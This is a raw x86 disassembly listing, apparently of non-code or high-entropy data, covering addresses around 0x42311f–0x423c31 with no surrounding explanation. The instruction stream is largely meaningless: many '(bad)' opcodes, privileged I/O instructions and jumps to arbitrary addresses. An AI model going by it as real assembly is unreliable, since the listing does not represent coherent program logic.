  42311f:	jmp    0x54bc:0xf41584aa
  423126:	(bad)  
  423127:	pop    edx
  423128:	adc    eax,0x1b923747
  42312d:	and    BYTE PTR [esi-0x72],0xeb
  423131:	adc    BYTE PTR [ecx],bh
  423133:	xchg   edx,eax
  423134:	or     dh,BYTE PTR [edi]
  423136:	aaa    
  423137:	(bad)  
  423138:	adc    ebx,DWORD PTR [eax+0x2ffcc8a0]
  42313e:	mov    ds:0xc5bd99e3,eax
  423143:	add    DWORD PTR [edx-0x2f4509f],edx
  423149:	adc    BYTE PTR [edx],0xbd
  42314c:	iret   
  42314d:	ds push ebp
  42314f:	mov    dh,0xc6
  423151:	jbe    0x4230de
  423153:	repnz mov al,ch
  423156:	jl     0x4231ae
  423158:	fsubr  QWORD PTR [esi+eiz*4-0x51]
  42315c:	dec    ecx
  42315d:	sbb    ebx,DWORD PTR ds:0x9d557ecb
  423163:	push   ebp
  423164:	icebp  
  423165:	ret    
  423166:	xor    al,0x94
  423168:	rep lods al,BYTE PTR ds:[esi]
  42316a:	mov    dl,0xee
  42316c:	(bad)  
  42316d:	jne    0x423143
  42316f:	xchg   ecx,eax
  423170:	std    
  423171:	mov    DWORD PTR [eax-0x53842212],ebp
  423177:	add    DWORD PTR [edx-0x10],edx
  42317a:	scas   eax,DWORD PTR es:[edi]
  42317b:	cmp    ecx,esp
  42317d:	scas   eax,DWORD PTR es:[edi]
  42317e:	push   eax
  42317f:	loop   0x423120
  423181:	jne    0x423146
  423183:	or     ebx,DWORD PTR [esi]
  423185:	xor    BYTE PTR [ebp-0x352f1102],0x76
  42318c:	push   cs
  42318d:	mov    bl,0x98
  42318f:	or     dh,al
  423191:	pop    esi
  423192:	jge    0x423167
  423194:	sahf   
  423195:	push   eax
  423196:	es leave 
  423198:	stc    
  423199:	pop    ebx
  42319a:	dec    edi
  42319b:	and    BYTE PTR [edx+0x3b8cb8a7],dl
  4231a1:	addr16 test eax,0xa4b1c37d
  4231a7:	pusha  
  4231a8:	mov    eax,0xec0c540a
  4231ad:	sub    DWORD PTR [edx],ebp
  4231af:	out    dx,eax
  4231b0:	sbb    eax,0xbaee5d15
  4231b5:	sti    
  4231b6:	rcr    DWORD PTR [edi+esi*1],0x36
  4231ba:	mov    ebx,0xb08d966e
  4231bf:	mov    WORD PTR [edi+0x0],es
	...
  423232:	add    BYTE PTR [eax],al
  423234:	(bad)  
  423235:	in     eax,dx
  423236:	lods   eax,DWORD PTR ds:[esi]
  423237:	imul   edi
  423239:	neg    edi
  42323b:	std    
  42323c:	stc    
  42323d:	idiv   DWORD PTR ds:0xb2dff3b0
  423243:	leave  
  423244:	add    al,0x77
  423246:	add    DWORD PTR [eax],eax
  423248:	cmc    
  423249:	add    BYTE PTR [eax],al
  42324b:	add    BYTE PTR [eax+0x54],dl
  42324e:	push   ebp
  42324f:	push   eax
  423250:	int3   
  423251:	test   al,0x2f
  423253:	repz (bad) 
  423255:	lahf   
  423256:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423257:	clc    
  423258:	inc    edx
  423259:	cwde   
  42325a:	and    al,cl
  42325c:	out    dx,eax
  42325d:	xchg   ecx,eax
  42325e:	pop    ds
  42325f:	loope  0x423230
  423261:	or     eax,0xa57100b8
  423266:	enter  0xc674,0x6f
  42326a:	lds    esp,FWORD PTR [edx]
  42326c:	pop    ecx
  42326d:	sub    esi,esi
  42326f:	lock inc ecx
  423271:	adc    BYTE PTR [ebp+0x529be4ba],0x19
  423278:	ror    DWORD PTR [edx-0x7b],0xea
  42327c:	pusha  
  42327d:	xchg   ebx,eax
  42327e:	jo     0x4232ad
  423280:	shl    cl,0x1a
  423283:	xor    DWORD PTR [esi+0x6445f530],ebx
  423289:	bound  edi,QWORD PTR [edi+0x35]
  42328c:	cmc    
  42328d:	xchg   ebp,eax
  42328e:	fwait
  42328f:	push   esp
  423290:	mov    esi,0xc7934072
  423295:	mov    esi,DWORD PTR [edi+0x5]
  423298:	aas    
  423299:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42329a:	fistp  WORD PTR [edi-0x5eabb773]
  4232a0:	mov    ah,0x3e
  4232a2:	and    eax,0xd3e1946e
  4232a7:	push   ebp
  4232a8:	stos   BYTE PTR es:[edi],al
  4232a9:	fwait
  4232aa:	icebp  
  4232ab:	mov    ds:0x39f87c60,eax
  4232b0:	test   al,0xfc
  4232b2:	cmp    ch,dl
  4232b4:	mov    ecx,0x785f3fac
  4232b9:	push   0xffffff8c
  4232bb:	loop   0x4232c8
  4232bd:	lods   al,BYTE PTR ds:[esi]
  4232be:	les    esp,FWORD PTR [ebx-0x19]
  4232c1:	xchg   edi,eax
  4232c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4232c3:	add    ebp,ecx
  4232c5:	push   es
  4232c6:	in     eax,0x7
  4232c8:	test   eax,0xa6715cd6
  4232cd:	cmp    bl,BYTE PTR [eax]
  4232cf:	(bad)  
  4232d0:	cmp    al,0xfb
  4232d2:	xchg   edi,eax
  4232d3:	imul   esp,DWORD PTR [esi+0x7930950a],0x92192e90
  4232dd:	fwait
  4232de:	aaa    
  4232df:	das    
  4232e0:	xor    BYTE PTR [esp+eiz*8],0x12
  4232e4:	stos   DWORD PTR es:[edi],eax
  4232e5:	mov    edx,0x65a3fa32
  4232ea:	loop   0x4232f2
  4232ec:	mov    esp,0xe4857f52
  4232f1:	cmp    bl,BYTE PTR [edi+0xd65bdcb]
  4232f7:	adc    BYTE PTR ss:[edi],0xf4
  4232fb:	mov    esp,0xe067fbb9
  423300:	mov    ds:0xa8c47d6a,al
  423305:	jno    0x42328d
  423307:	fcmovu st,st(7)
  423309:	in     eax,0xcd
  42330b:	sahf   
  42330c:	lds    esi,FWORD PTR [ebx-0x65a35bf0]
  423312:	jo     0x423352
  423314:	jmp    0xbceea97b
  423319:	inc    ebx
  42331a:	or     esi,DWORD PTR [esi]
  42331c:	xor    BYTE PTR [edi+edx*2-0x68],0xb0
  423321:	gs push es
  423323:	mov    ds:0x5fa2b54f,al
  423328:	inc    BYTE PTR ds:0x3c322333
  42332e:	or     dh,0x2c
  423331:	js     0x423350
  423333:	cld    
  423334:	mov    ds:0x69fa6e97,eax
  423339:	gs xchg ebp,eax
  42333b:	jb     0x42332d
  42333d:	(bad)  
  42333e:	mov    dl,0xb9
  423340:	imul   eax,DWORD PTR [eax],0x0
	...
  4233b2:	add    BYTE PTR [eax],al
  4233b4:	push   edx
  4233b5:	sub    BYTE PTR [esi],0x69
  4233b8:	(bad)  
  4233b9:	in     eax,dx
  4233ba:	push   edi
  4233bb:	mov    ebx,0x8e4aa104
  4233c0:	push   ebx
  4233c1:	sub    eax,0x77f9660c
  4233c6:	add    DWORD PTR [eax],eax
  4233c8:	cmc    
  4233c9:	add    BYTE PTR [eax],al
  4233cb:	add    BYTE PTR [eax+0x51],bl
  4233ce:	push   0xc
  4233d0:	pop    edx
  4233d1:	jmp    0xfb259c3d
  4233d6:	ins    BYTE PTR es:[edi],dx
  4233d7:	mov    al,ds:0x13fb643c
  4233dc:	stos   BYTE PTR es:[edi],al
  4233dd:	sbb    edx,edi
  4233df:	ror    edi,0x30
  4233e2:	jle    0x423408
  4233e4:	pop    es
  4233e5:	xchg   esi,eax
  4233e6:	mov    al,0x84
  4233e8:	popf   
  4233e9:	adc    DWORD PTR [edi+edx*8+0x78514279],ebp
  4233f0:	xor    dl,BYTE PTR [ecx]
  4233f2:	push   edi
  4233f3:	cwde   
  4233f4:	mov    dl,0xdc
  4233f6:	in     al,dx
  4233f7:	and    esi,DWORD PTR [esi]
  4233f9:	jg     0x4233a6
  4233fb:	cmp    ebx,DWORD PTR [ebx-0xe511fdd]
  423401:	pop    esp
  423402:	imul   esi,DWORD PTR [eax+0x69d9ee6b],0xaaf6d838
  42340c:	pusha  
  42340d:	pop    ecx
  42340e:	pop    edx
  42340f:	mov    esp,0xda432335
  423414:	xor    BYTE PTR [esi],dh
  423416:	mov    dh,0xd3
  423418:	mov    ds:0x827bed55,eax
  42341d:	shl    esi,0x51
  423420:	or     eax,0xb067fc9b
  423425:	xor    esi,DWORD PTR [ecx-0x4c]
  423428:	repnz out 0x1,al
  42342b:	xchg   BYTE PTR [edx+0x1d],bh
  42342e:	adc    edi,DWORD PTR [ecx+0x23]
  423431:	mov    eax,?
  423433:	sbb    BYTE PTR cs:[eax],0xc7
  423437:	aam    0x62
  423439:	pop    eax
  42343a:	leave  
  42343b:	clc    
  42343c:	push   ebp
  42343d:	rcr    BYTE PTR [esi+0x6e],0x8c
  423441:	push   es
  423442:	in     eax,0x93
  423444:	mov    al,ds:0xfaa74c28
  423449:	jnp    0x423462
  42344b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42344c:	push   ds
  42344d:	mov    bl,0x2f
  42344f:	cmp    DWORD PTR [esi-0x4f534134],eax
  423455:	xor    ah,BYTE PTR [ecx+0x729aeccb]
  42345b:	inc    edi
  42345c:	ins    BYTE PTR es:[edi],dx
  42345d:	sbb    eax,0x5e5fe91f
  423462:	push   0x24c27b0e
  423467:	push   edx
  423468:	sar    DWORD PTR [esi+0x230538d6],1
  42346e:	cmp    eax,0xb39bb09c
  423473:	fiadd  WORD PTR [esp+eiz*4-0x63d5625]
  42347a:	call   0xb92e:0x9771f2f5
  423481:	rcl    DWORD PTR [ecx],0xc6
  423484:	sbb    eax,DWORD PTR [edi*1+0x2da04c31]
  42348b:	sbb    eax,0x26734fc9
  423490:	mov    al,ds:0xf35e800d
  423495:	cmp    eax,0x16b04696
  42349a:	lds    ebx,FWORD PTR [ebx+0x708e185]
  4234a0:	cs push cs
  4234a2:	xchg   edi,eax
  4234a3:	aas    
  4234a4:	pop    DWORD PTR [edx-0x75]
  4234a7:	shl    BYTE PTR [eax+0x5b341fe9],0x9e
  4234ae:	mov    ebx,0x61e6413a
  4234b3:	test   DWORD PTR ds:0x63cdf6ab,0x70bf367f
  4234bd:	mul    DWORD PTR [ecx+0x1a1]
	...
  423533:	add    BYTE PTR [edx-0x40887052],bl
  423539:	ja     0x423535
  42353b:	out    dx,eax
  42353c:	dec    ebx
  42353d:	jg     0x4234d2
  42353f:	aad    0x8e
  423541:	adc    DWORD PTR [edi+edi*2+0x178ee],0xfffffff5
  423549:	add    BYTE PTR [eax],al
  42354b:	add    bl,dh
  42354d:	out    0x53,al
  42354f:	jae    0x4235c4
  423551:	pusha  
  423552:	inc    edi
  423553:	ds dec ebp
  423555:	fst    st(0)
  423557:	sub    esi,DWORD PTR [esi-0x49ff2f30]
  42355d:	mov    ds:0x1a3976de,eax
  423562:	mov    cs,WORD PTR [ecx-0x3f]
  423565:	mov    al,0xc8
  423567:	or     eax,0xcafd98da
  42356c:	pop    esi
  42356d:	adc    ebx,eax
  42356f:	pop    esi
  423570:	xchg   ebp,eax
  423571:	add    esi,DWORD PTR [ebp+0x2f]
  423574:	mov    dl,bl
  423576:	mov    edx,0x3f8893fe
  42357b:	out    dx,eax
  42357c:	jle    0x42350a
  42357e:	push   ecx
  42357f:	in     al,0x37
  423581:	inc    ebx
  423582:	pop    ebp
  423583:	stc    
  423584:	ds jecxz 0x42351e
  423587:	or     al,0xa9
  423589:	sbb    esp,esp
  42358b:	hlt    
  42358c:	fcmovb st,st(1)
  42358e:	ret    0xd87e
  423591:	push   eax
  423592:	mov    eax,ds:0xed525d18
  423597:	lea    edi,[esi-0x2026596e]
  42359d:	stos   BYTE PTR es:[edi],al
  42359e:	xor    DWORD PTR [esi-0x6],edx
  4235a1:	sbb    esp,edi
  4235a3:	ret    
  4235a4:	push   esi
  4235a5:	mov    dl,ch
  4235a7:	sbb    bl,BYTE PTR [edx+0x1ad0d151]
  4235ad:	push   cs
  4235ae:	addr16 nop
  4235b0:	test   BYTE PTR ds:0x5668aaed,0xe8
  4235b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4235b8:	test   DWORD PTR [ebx],0x893dcdec
  4235be:	sub    bl,ch
  4235c0:	test   al,al
  4235c2:	and    BYTE PTR [edx+0x5a9dfd66],0xcd
  4235c9:	or     BYTE PTR [edi],bl
  4235cb:	adc    al,0xc4
  4235cd:	xor    dl,bh
  4235cf:	inc    esp
  4235d0:	popa   
  4235d1:	xor    DWORD PTR [ecx-0x3],eax
  4235d4:	jae    0x4235b8
  4235d6:	push   edx
  4235d8:	sub    al,0x18
  4235da:	mov    eax,0x7966108a
  4235df:	loop   0x4235af
  4235e1:	aas    
  4235e2:	push   ecx
  4235e3:	sbb    esi,0x252907a9
  4235e9:	dec    ebx
  4235ea:	gs scas eax,DWORD PTR es:[edi]
  4235ec:	mov    bl,0x7e
  4235ee:	fisub  DWORD PTR [edi-0x5e278d46]
  4235f4:	(bad)  [ebp+0x7a]
  4235f7:	stc    
  4235f8:	out    dx,eax
  4235f9:	and    DWORD PTR ds:0xcdb7194e,0x30
  423600:	mov    eax,0x4f31708d
  423605:	fnsave gs:[esi]
  423608:	in     al,dx
  423609:	adc    ebx,esp
  42360b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42360c:	xchg   bh,ch
  42360e:	retf   
  42360f:	test   al,0x69
  423611:	(bad)  
  423612:	sub    al,0xcd
  423614:	mov    ch,0xe3
  423616:	add    eax,0x58b39bba
  42361b:	or     eax,0xa37bbd18
  423620:	xchg   esp,eax
  423621:	dec    esi
  423622:	scas   al,BYTE PTR es:[edi]
  423623:	gs retf 
  423625:	or     ecx,ecx
  423627:	daa    
  423628:	retf   
  423629:	ds pop esp
  42362b:	dec    ecx
  42362c:	inc    eax
  42362d:	push   es
  42362e:	rcl    ah,0xee
  423631:	punpcklwd mm7,mm6
  423634:	jae    0x423670
  423636:	sbb    al,0x81
  423638:	lahf   
  423639:	sub    ecx,edi
  42363b:	mov    DWORD PTR [edi-0x47],ebp
  42363e:	jg     0x42361e
  423640:	add    BYTE PTR [eax],0x0
	...
  4236b3:	add    BYTE PTR [edi],ah
  4236b5:	sub    eax,0x7d7f2d7d
  4236ba:	ja     0x4236eb
  4236bc:	mov    cl,ah
  4236be:	paddq  mm2,QWORD PTR [esp+ecx*4+0x79e36ed6]
  4236c6:	add    DWORD PTR [eax],eax
  4236c8:	cmc    
  4236c9:	add    BYTE PTR [eax],al
  4236cb:	add    BYTE PTR [edx+0x8],dl
  4236ce:	jmp    0x788d8100
  4236d3:	mov    eax,0x7dd2c0e4
  4236d8:	sub    ah,dh
  4236da:	mov    bl,0x2b
  4236dc:	push   esp
  4236dd:	and    eax,0xd7cbad6c
  4236e2:	clc    
  4236e3:	das    
  4236e4:	and    DWORD PTR [edx+0x71282747],ebp
  4236ea:	push   ebp
  4236eb:	jne    0x4236bf
  4236ed:	fimul  DWORD PTR [esi+0x11]
  4236f0:	rcl    DWORD PTR [ecx-0x5e],0x1d
  4236f4:	retf   0xa51c
  4236f7:	call   0x9069c875
  4236fc:	pushf  
  4236fd:	stos   DWORD PTR es:[edi],eax
  4236fe:	in     eax,0x8d
  423700:	xor    edi,DWORD PTR [eax-0x4]
  423703:	pop    es
  423704:	xor    al,0x5e
  423706:	mov    esi,0xedda91be
  42370b:	popa   
  42370c:	aas    
  42370d:	push   ss
  42370e:	(bad)
  423711:	(bad)  
  423712:	std    
  423713:	fs ja  0x423727
  423716:	ja     0x423756
  423718:	jne    0x423751
  42371a:	enter  0x7f09,0x75
  42371e:	mov    cs,WORD PTR [ebx-0x47]
  423721:	mov    al,0xc
  423723:	push   eax
  423724:	xchg   esp,eax
  423725:	pop    ebp
  423726:	cli    
  423727:	add    al,BYTE PTR [ebp-0x36187705]
  42372d:	pop    ds
  42372e:	and    ah,ch
  423730:	mov    DWORD PTR [ebx-0x42],0x1c8ef1bf
  423737:	cs fst st(5)
  42373a:	shl    BYTE PTR [eax-0x60],cl
  42373d:	cmp    eax,0xcf2e5b9a
  423742:	jg     0x423763
  423744:	push   ds
  423745:	jge    0x423725
  423747:	pop    sp
  423749:	or     DWORD PTR [edi],ecx
  42374b:	js     0x423794
  42374d:	mov    al,0x37
  42374f:	adc    DWORD PTR [edx],0x6a
  423752:	arpl   cx,di
  423754:	add    DWORD PTR [esi+ebx*8+0x59],eax
  423758:	or     eax,DWORD PTR [edx-0x76]
  42375b:	in     ax,0x69
  42375e:	repz mov cl,0xd
  423761:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423762:	shl    DWORD PTR ss:[eax-0x5a8e62f0],1
  423769:	ins    DWORD PTR es:[edi],dx
  42376a:	xor    ecx,esp
  42376c:	sbb    eax,0xb1847bf6
  423771:	js     0x423715
  423773:	push   ecx
  423774:	xchg   esi,eax
  423775:	mov    cl,0xd6
  423777:	bound  esi,QWORD PTR ds:0x716b1ba
  42377d:	in     al,0xab
  42377f:	les    esp,FWORD PTR [esi]
  423781:	popf   
  423782:	jmp    0xf768263b
  423787:	lock and esi,DWORD PTR [edx]
  42378a:	mov    dh,0x6b
  42378c:	push   esp
  42378d:	je     0x4237e2
  42378f:	ss das 
  423791:	fstp   TBYTE PTR [edi+0x1e]
  423794:	retf   0xb497
  423797:	rcl    DWORD PTR [ebx-0x57],0xd0
  42379b:	(bad)  [ecx+0x4c5316b]
  4237a1:	loop   0x4237c6
  4237a3:	fcmovnu st,st(7)
  4237a5:	jl     0x42372e
  4237a7:	outs   dx,BYTE PTR ds:[esi]
  4237a8:	mov    DWORD PTR [ecx+eiz*8+0x1a6911a6],eax
  4237af:	outs   dx,DWORD PTR ds:[esi]
  4237b0:	add    edi,ebp
  4237b2:	test   al,0x46
  4237b4:	push   esp
  4237b5:	mov    ebx,0xf9b3aee7
  4237ba:	fs push ss
  4237bc:	(bad)  
  4237bd:	loopne 0x423788
  4237bf:	daa    
  4237c0:	jl     0x4237c2
	...
  423832:	add    BYTE PTR [eax],al
  423834:	int    0x39
  423836:	mov    eax,0xef97fc97
  42383b:	jnp    0x423814
  42383d:	jge    0x4238a4
  42383f:	xchg   ecx,eax
  423840:	xor    BYTE PTR [esi+0x7ad8f00a],cl
  423846:	add    DWORD PTR [eax],eax
  423848:	cmc    
  423849:	add    BYTE PTR [eax],al
  42384b:	add    BYTE PTR [edi],al
  42384d:	das    
  42384e:	mov    bh,0x6c
  423850:	stc    
  423851:	fs jo  0x423886
  423854:	(bad)  
  423855:	clc    
  423856:	xor    al,0x2f
  423858:	cmp    ebx,DWORD PTR ds:0xaebe387d
  42385e:	std    
  42385f:	mov    ecx,0xa2a415bc
  423864:	add    DWORD PTR [edi+ebp*1],ecx
  423867:	dec    ecx
  423868:	xchg   esi,eax
  423869:	add    eax,0x744fbd8c
  42386e:	mov    ds:0x3119b1d8,eax
  423873:	popa   
  423874:	iret   
  423875:	(bad)  
  423877:	cdq    
  423878:	jbe    0x4238ea
  42387a:	scas   al,BYTE PTR es:[edi]
  42387b:	scas   al,BYTE PTR es:[edi]
  42387c:	cli    
  42387d:	cmp    ebx,DWORD PTR cs:[eax+eiz*1]
  423881:	push   0xffffffcb
  423883:	adc    eax,0x7f23d0d0
  423888:	and    DWORD PTR [ecx],ecx
  42388a:	stos   DWORD PTR es:[edi],eax
  42388b:	mov    esp,0x83c95f19
  423890:	test   ebx,ebp
  423892:	fmul   st,st(4)
  423894:	lock xchg esi,eax
  423896:	test   eax,0xf0e8072a
  42389b:	xchg   ecx,eax
  42389c:	in     al,0xf4
  42389e:	mov    bl,0xa8
  4238a0:	mov    ch,al
  4238a2:	iret   
  4238a3:	out    0xa9,eax
  4238a5:	adc    al,0x31
  4238a7:	push   cs
  4238a8:	jp     0x423902
  4238aa:	mov    dh,0xe3
  4238ac:	shr    al,cl
  4238ae:	cwde   
  4238af:	mov    dl,0x5f
  4238b1:	test   ah,dl
  4238b3:	aam    0x15
  4238b5:	in     al,dx
  4238b6:	jno    0x423916
  4238b8:	or     edi,edi
  4238ba:	stos   BYTE PTR es:[edi],al
  4238bb:	sar    BYTE PTR ds:0x966428c8,cl
  4238c1:	push   edi
  4238c2:	push   0xffffffe6
  4238c4:	push   edx
  4238c5:	lods   al,BYTE PTR ds:[esi]
  4238c6:	popf   
  4238c7:	adc    al,0xcd
  4238c9:	call   0x2e886e3e
  4238ce:	jb     0x4238e2
  4238d0:	repz dec esp
  4238d2:	xchg   edx,eax
  4238d3:	jo     0x423901
  4238d5:	popf   
  4238d6:	inc    ecx
  4238d7:	mov    ds:0x29aa581a,eax
  4238dc:	jmp    0x49a2a3b9
  4238e1:	xchg   esp,eax
  4238e2:	jns    0x4238e5
  4238e4:	pop    ss
  4238e5:	dec    esp
  4238e6:	loopne 0x42389d
  4238e8:	loopne 0x423906
  4238ea:	push   ebp
  4238eb:	mov    dl,0x1b
  4238ed:	mov    bl,bh
  4238ef:	xchg   edi,eax
  4238f0:	(bad)  
  4238f1:	neg    DWORD PTR [ecx+0x1d]
  4238f4:	pop    ebp
  4238f5:	jne    0x4238ab
  4238f7:	push   ss
  4238f8:	xchg   ecx,eax
  4238f9:	aad    0xfd
  4238fb:	mov    dl,0xe7
  4238fd:	xchg   esp,eax
  4238fe:	and    ebx,ebp
  423900:	mov    ebx,0x61cd68d4
  423905:	hlt    
  423906:	xor    ebx,DWORD PTR [edx+0x2]
  423909:	popa   
  42390a:	popf   
  42390b:	mov    edi,0x1a5593d6
  423910:	loop   0x423912
  423912:	jo     0x4238e5
  423914:	bound  esi,QWORD PTR [edx-0x738820a3]
  42391a:	dec    edi
  42391b:	pop    ebp
  42391c:	sbb    al,0x83
  42391e:	fs add edx,ebp
  423921:	fcmovne st,st(6)
  423923:	xchg   ecx,eax
  423924:	popa   
  423925:	cmp    al,0xc0
  423927:	mov    dl,0x10
  423929:	pushf  
  42392a:	out    dx,eax
  42392b:	in     al,dx
  42392c:	lock pop es
  42392e:	js     0x42390b
  423930:	add    al,0x65
  423932:	cdq    
  423933:	sub    al,0xe
  423935:	test   eax,0xc2a3f584
  42393a:	mov    eax,ds:0xda00e3b8
  42393f:	and    al,0x83
	...
  4239b1:	add    BYTE PTR [eax],al
  4239b3:	add    BYTE PTR [esi-0x377e796],dl
  4239b9:	cli    
  4239ba:	xchg   esi,eax
  4239bb:	jle    0x4239aa
  4239bd:	mov    cl,0x66
  4239bf:	mov    WORD PTR [ebx],fs
  4239c1:	test   DWORD PTR [esi],esp
  4239c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4239c4:	int    0x7b
  4239c6:	add    DWORD PTR [eax],eax
  4239c8:	cmc    
  4239c9:	add    BYTE PTR [eax],al
  4239cb:	add    ch,cl
  4239cd:	jmp    0x134dadd0
  4239d2:	sbb    bh,BYTE PTR [edx+0x1f]
  4239d5:	add    al,BYTE PTR [edx]
  4239d7:	jp     0x4239e4
  4239d9:	fwait
  4239da:	nop
  4239db:	mov    ebx,0xf4ce116d
  4239e0:	mov    eax,ds:0xef8b3994
  4239e5:	out    0x18,al
  4239e7:	loope  0x4239ae
  4239e9:	sar    ebp,0x1e
  4239ec:	test   eax,0x4cfa1731
  4239f1:	push   0x534898db
  4239f6:	stos   BYTE PTR es:[edi],al
  4239f7:	mov    edx,0x7247e118
  4239fc:	ins    BYTE PTR es:[edi],dx
  4239fd:	lods   al,BYTE PTR ds:[esi]
  4239fe:	xchg   esp,eax
  4239ff:	jp     0x423a4f
  423a01:	mov    al,0x2b
  423a03:	adc    eax,DWORD PTR [edx-0x683a1b96]
  423a09:	fdivr  QWORD PTR [eax-0x2606e069]
  423a0f:	or     DWORD PTR ds:0x6d4060bf,eax
  423a15:	xchg   esi,eax
  423a16:	scas   al,BYTE PTR es:[edi]
  423a17:	pop    edi
  423a18:	sbb    edi,DWORD PTR [esi]
  423a1a:	shl    DWORD PTR [ebx+0x50b2af2d],cl
  423a20:	in     eax,0x3c
  423a22:	or     edx,ebp
  423a24:	int    0xeb
  423a26:	mov    al,ds:0x55815fff
  423a2b:	mov    ebx,0x727ed465
  423a30:	ins    DWORD PTR es:[edi],dx
  423a31:	pop    esp
  423a32:	mov    edi,0x664b4d22
  423a37:	push   edx
  423a38:	call   0x5ce9a380
  423a3d:	je     0x423a34
  423a3f:	aas    
  423a40:	jno    0x423a03
  423a42:	mov    al,ds:0xa8cc4867
  423a47:	sbb    BYTE PTR [edx-0x11],ch
  423a4a:	mov    bl,0xa8
  423a4c:	ins    BYTE PTR es:[edi],dx
  423a4d:	scas   al,BYTE PTR es:[edi]
  423a4e:	inc    esp
  423a50:	rcl    DWORD PTR [eax],0x3d
  423a53:	sub    BYTE PTR [edi-0x71],cl
  423a56:	mov    DWORD PTR [ecx-0x735f6e40],0x825f688
  423a60:	nop
  423a61:	inc    ebx
  423a62:	mov    ecx,ebp
  423a64:	adc    edi,ecx
  423a66:	test   al,0xea
  423a68:	mov    DWORD PTR [edx-0x7ace235a],esi
  423a6e:	pop    eax
  423a6f:	jae    0x423ad2
  423a71:	(bad)  
  423a73:	mov    BYTE PTR [esi],ah
  423a75:	lods   al,BYTE PTR ds:[esi]
  423a76:	xor    eax,0x43efcd94
  423a7b:	sub    DWORD PTR [edx-0x6901f40b],ecx
  423a81:	pop    esi
  423a82:	rcr    BYTE PTR ds:0x11a5646c,cl
  423a88:	cmc    
  423a89:	js     0x423a26
  423a8b:	jmp    0xef7b99c3
  423a90:	aam    0xec
  423a92:	(bad)  
  423a93:	in     eax,0x7e
  423a95:	mov    cl,0x7d
  423a97:	aam    0x55
  423a99:	stos   BYTE PTR es:[edi],al
  423a9a:	mov    dl,0xce
  423a9c:	enter  0x3887,0x8e
  423aa0:	mov    esi,0x7e2394df
  423aa5:	cs sbb cl,al
  423aa8:	sub    eax,0x8022c173
  423aad:	push   edx
  423aae:	or     bh,BYTE PTR [ebx+edi*8-0x69]
  423ab2:	fnstenv [ebx]
  423ab4:	pop    esp
  423ab5:	adc    edi,ebp
  423ab7:	jle    0x423a90
  423ab9:	shl    DWORD PTR [eax],1
  423abb:	aaa    
  423abc:	idiv   DWORD PTR [edi+esi*8+0x63]
  423ac0:	test   eax,0x0
	...
  423b31:	add    BYTE PTR [eax],al
  423b33:	add    BYTE PTR [edi+esi*1+0x4a],al
  423b37:	fwait
  423b38:	jnp    0x423b39
  423b3a:	aad    0xff
  423b3c:	gs popa 
  423b3e:	into   
  423b3f:	add    al,0x49
  423b41:	(bad)  
  423b42:	push   ebp
  423b43:	jb     0x423b07
  423b45:	jl     0x423b48
  423b47:	add    ch,dh
  423b49:	add    BYTE PTR [eax],al
  423b4b:	add    BYTE PTR [eax+0x4eb826b4],ah
  423b51:	shr    BYTE PTR [esi],1
  423b53:	mov    ah,0xee
  423b55:	sbb    al,0x2c
  423b57:	gs mov dh,0x18
  423b5a:	aas    
  423b5b:	or     al,0x9f
  423b5d:	ins    DWORD PTR es:[edi],dx
  423b5e:	rcr    dl,0xa1
  423b61:	mov    cl,BYTE PTR [edi+0x1b]
  423b64:	fsubp  st(2),st
  423b66:	rcr    BYTE PTR [edi-0xd253adc],0x72
  423b6d:	ins    DWORD PTR es:[edi],dx
  423b6e:	cmp    al,0x72
  423b70:	mov    al,0xe6
  423b72:	or     BYTE PTR [esi],dl
  423b74:	daa    
  423b75:	and    BYTE PTR [edx-0x6bae924],0x2
  423b7c:	mov    ds:0xb9fb286f,eax
  423b81:	push   esi
  423b82:	popf   
  423b83:	aas    
  423b84:	push   0x3af7038c
  423b89:	push   ss
  423b8a:	sbb    eax,0x7aa65f77
  423b8f:	(bad)  
  423b91:	jecxz  0x423bd6
  423b93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423b94:	scas   al,BYTE PTR es:[edi]
  423b95:	xor    bh,bl
  423b97:	retf   
  423b98:	std    
  423b99:	mov    eax,0xa6811267
  423b9e:	(bad)  [edx+0xe]
  423ba1:	cwde   
  423ba2:	jo     0x423b43
  423ba4:	imul   esp,DWORD PTR gs:[ecx-0x4f10d5a6],0x1024b1f5
  423baf:	idiv   BYTE PTR [ecx]
  423bb1:	test   eax,0x177ca848
  423bb6:	push   ebx
  423bb7:	adc    eax,0x56e986c1
  423bbc:	ja     0x423bb3
  423bbe:	pop    ecx
  423bbf:	mov    ds:0x32057cce,eax
  423bc4:	cmp    al,bl
  423bc6:	jbe    0x423b79
  423bc8:	add    al,0x4c
  423bca:	and    al,0xa9
  423bcc:	and    eax,0x52ec7c88
  423bd1:	inc    eax
  423bd2:	dec    edi
  423bd3:	imul   esi,DWORD PTR [edi+0x16],0x2a
  423bd7:	in     al,dx
  423bd8:	add    DWORD PTR [edx+0x6e],edi
  423bdb:	out    dx,al
  423bdc:	mov    al,ds:0x6fadaeaf
  423be1:	(bad)  
  423be2:	jecxz  0x423c19
  423be4:	inc    edx
  423be5:	jno    0x423c27
  423be7:	cmp    al,0xf9
  423be9:	sti    
  423bea:	sbb    esp,ebx
  423bec:	and    eax,0x19733ba8
  423bf1:	retf   0x3a4d
  423bf4:	add    al,0x57
  423bf6:	scas   al,BYTE PTR es:[edi]
  423bf7:	ret    0x3d11
  423bfa:	dec    esi
  423bfb:	fsub   DWORD PTR [ebx-0x26]
  423bfe:	mov    ecx,0x51d8fbdd
  423c03:	fwait
  423c04:	adc    al,0x2f
  423c06:	pusha  
  423c07:	xor    BYTE PTR [ebx+0x701bf443],cl
  423c0d:	out    0x85,eax
  423c0f:	ror    bh,cl
  423c11:	jns    0x423bdf
  423c13:	mov    ch,0xd5
  423c15:	or     al,0x12
  423c17:	push   esi
  423c18:	shl    BYTE PTR ds:0x253238e0,0xeb
  423c1f:	sub    ebx,DWORD PTR [edi+0x13]
  423c22:	imul   eax,DWORD PTR [di],0x62
  423c26:	mov    ecx,0x27fcd326
  423c2b:	sub    cl,BYTE PTR [esi+ecx*2]
  423c2e:	aam    0x68
  423c30:	cld    
  423c31:	sbb    edx,DWORD PTR [esi-0x28f3dd30]
